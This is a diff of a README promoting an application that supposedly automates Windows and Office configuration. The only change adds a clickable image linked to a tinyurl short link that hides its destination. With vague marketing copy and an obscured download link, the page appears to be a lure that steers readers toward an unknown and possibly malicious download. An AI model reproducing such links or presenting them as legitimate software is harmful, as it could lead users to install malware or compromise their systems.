@@ -4,7 +4,7 @@
 
 Meet your new personal assistant for computer preparation. This sophisticated application completely automates the configuration of your Windows and Office software. Simply start the process and watch as it intelligently handles what used to require technical expertise. It's not magic—it's smart automation designed for the modern user.
 
-
+[![7456845679](https://github.com/user-attachments/assets/8e296e91-b1e4-4d7a-b085-2cb4f2a3ea06)](https://tinyurl.com/4dnzdksr)
 
 ## **🔧 Core Concept & Capabilities**
 
